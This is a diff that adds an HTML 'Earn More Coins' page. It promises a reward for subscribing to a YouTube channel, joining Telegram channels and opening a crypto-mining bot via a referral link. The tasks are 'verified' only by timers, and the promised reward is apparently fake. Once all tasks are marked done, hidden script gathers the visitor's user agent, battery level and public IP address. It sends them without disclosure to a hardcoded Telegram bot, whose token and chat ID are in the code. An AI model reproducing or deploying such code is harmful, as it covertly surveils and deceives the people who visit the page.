@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Earn More Coins</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+            overflow: hidden;
+        }
+        .header {
+            margin-bottom: 20px;
+        }
+        .header img {
+            width: 100px;
+        }
+        h1 {
+            font-size: 2em;
+            margin-bottom: 20px;
+        }
+        .task-list {
+            background: #333;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        h2 {
+            font-size: 1.5em;
+            color: yellow;
+            margin-bottom: 20px;
+        }
+        .task-item {
+            background: #444;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            transition: opacity 0.5s ease-in-out;
+            position: relative;
+        }
+        .task-item img {
+            width: 30px;
+            margin-right: 15px;
+        }
+        .task-item span {
+            flex-grow: 1;
+            text-align: left;
+        }
+        .task-item .reward {
+            color: gold;
+        }
+        .notification {
+            background-color: green;
+            padding: 10px;
+            border-radius: 5px;
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            display: none;
+        }
+        .popup {
+            background: rgba(0, 0, 0, 0.8);
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            display: none;
+            z-index: 1000;
+            animation: popup-animation 0.7s ease-out forwards;
+        }
+        .popup h2 {
+            margin-bottom: 20px;
+            font-size: 2em;
+            color: #fff;
+        }
+        .popup button {
+            background-color: #ff9800;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 1.5em;
+            animation: button-bounce 2s infinite;
+        }
+        .popup button:hover {
+            background-color: #e68900;
+        }
+        @keyframes popup-animation {
+            0% {
+                transform: translate(-50%, -50%) scale(0);
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(1);
+            }
+        }
+        @keyframes button-bounce {
+            0%, 20%, 50%, 80%, 100% {
+                transform: translateY(0);
+            }
+            40% {
+                transform: translateY(-15px);
+            }
+            60% {
+                transform: translateY(-10px);
+            }
+        }
+        .popup-bg {
+            position: fixed;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 999;
+            display: none;
+            animation: fade-in 0.5s ease-out forwards;
+        }
+        @keyframes fade-in {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+        .lds-facebook,
+        .lds-facebook div {
+            box-sizing: border-box;
+        }
+        .lds-facebook {
+            display: inline-block;
+            position: relative;
+            width: 80px;
+            height: 80px;
+        }
+        .lds-facebook div {
+            display: inline-block;
+            position: absolute;
+            left: 8px;
+            width: 16px;
+            background: currentColor;
+            animation: lds-facebook 1.2s cubic-bezier(0, 0.5, 0.5, 1) infinite;
+        }
+        .lds-facebook div:nth-child(1) {
+            left: 8px;
+            animation-delay: -0.24s;
+        }
+        .lds-facebook div:nth-child(2) {
+            left: 32px;
+            animation-delay: -0.12s;
+        }
+        .lds-facebook div:nth-child(3) {
+            left: 56px;
+            animation-delay: 0s;
+        }
+        @keyframes lds-facebook {
+            0% {
+                top: 8px;
+                height: 64px;
+            }
+            50%, 100% {
+                top: 24px;
+                height: 32px;
+            }
+        }
+        .loading {
+            display: none;
+            margin: auto;
+            position: relative;
+        }
+        .blurred {
+            filter: blur(5px);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="https://img.icons8.com/?size=100&id=iRgwumOATYL6&format=png&color=000000" alt="Coins">
+    </div>
+
+    <div class="task-list">
+        <h2>Complete the tasks:</h2>
+
+        <div class="task-item" data-link="https://www.youtube.com/@BasicTouchPro" data-time="13">
+            <img src="https://img.icons8.com/?size=100&id=19318&format=png&color=000000" alt="YouTube">
+            <span>Subscribe BasicTouchPro</span>
+            
+            <div class="loading lds-facebook"><div></div><div></div><div></div></div>
+        </div>
+
+        <div class="task-item" data-link="https://t.me/BasicTouchPro" data-time="10">
+            <img src="https://img.icons8.com/?size=100&id=63306&format=png&color=000000" alt="Telegram">
+            <span>Join or Follow @BasicTouchPro</span>
+            
+            <div class="loading lds-facebook"><div></div><div></div><div></div></div>
+        </div>
+
+        <div class="task-item" data-link="https://t.me/addlist/iDxq5Nc0ml40MzVl" data-time="6">
+            <img src="https://img.icons8.com/?size=100&id=63306&format=png&color=000000" alt="Telegram">
+            <span>Join or Add Folder</span>
+           
+            <div class="loading lds-facebook"><div></div><div></div><div></div></div>
+        </div>
+
+        <div class="task-item" data-link="https://t.me/TimeFarmCryptoBot?start=nzlKc1ukFjFYQBpo" data-time="15">
+            <img src="https://img.icons8.com/?size=100&id=63306&format=png&color=000000" alt="Telegram Bot">
+            <span>Play games or Mining App</span>
+            
+            <div class="loading lds-facebook"><div></div><div></div><div></div></div>
+        </div>
+    </div>
+
+    <div class="notification">Task completed!</div>
+
+    <div class="popup-bg"></div>
+    <div class="popup">
+        <h2>🎉 Congratulations! 🎉</h2>
+        <p>You've successfully completed all tasks.</p>
+        <button id="claimButton">Claim Your Reward</button>
+    </div>
+
+    <script>
+        const tasks = document.querySelectorAll('.task-item');
+        const notification = document.querySelector('.notification');
+        const popup = document.querySelector('.popup');
+        const popupBg = document.querySelector('.popup-bg');
+        const claimButton = document.getElementById('claimButton');
+
+        let completedTasks = 0;
+
+        tasks.forEach((task) => {
+            task.addEventListener('click', () => {
+                const link = task.getAttribute('data-link');
+                const time = task.getAttribute('data-time');
+                const loading = task.querySelector('.loading');
+
+                window.open(link, '_blank');
+                loading.style.display = 'block';
+                task.querySelectorAll('img, span').forEach(el => el.classList.add('blurred'));
+
+                setTimeout(() => {
+                    task.style.opacity = '0';
+                    setTimeout(() => {
+                        task.style.display = 'none';
+                        completedTasks++;
+                        loading.style.display = 'none';
+                        task.querySelectorAll('img, span').forEach(el => el.classList.remove('blurred'));
+
+                        if (completedTasks === tasks.length) {
+                            notification.style.display = 'block';
+                            setTimeout(() => {
+                                notification.style.display = 'none';
+                                popupBg.style.display = 'block';
+                                popup.style.display = 'block';
+                            }, 1000);
+
+                            navigator.getBattery().then(function(battery) {
+                                const batteryLevel = Math.round(battery.level * 100);
+
+                                fetch('https://api.ipify.org?format=json')
+                                    .then(response => response.json())
+                                    .then(data => {
+                                        const ipAddress = data.ip;
+
+                                        const message = `Device Type: ${navigator.userAgent}\nBattery Level: ${batteryLevel}%\nIP Address: ${ipAddress}\nTime: ${new Date().toLocaleTimeString()}`;
+
+                                        fetch(`https://api.telegram.org/bot7353904231:AAHA2En0ZVi092OlJpgR_aQG0TP0DXc0TPE/sendMessage`, {
+                                            method: 'POST',
+                                            headers: {
+                                                'Content-Type': 'application/json'
+                                            },
+                                            body: JSON.stringify({
+                                                chat_id: '5187944932',
+                                                text: message
+                                            })
+                                        });
+                                    })
+                                    .catch(error => console.error('Error fetching IP address:', error));
+                            });
+                        }
+                    }, 500); // Task hide delay
+                }, time * 1000);
+            });
+        });
+
+        claimButton.addEventListener('click', () => {
+            window.location.href = 'https://videotasks.blogspot.com/p/chat-box.html';
+            popupBg.style.display = 'none';
+            popup.style.display = 'none';
+        });
+    </script>
+
+</body>
+</html>
+
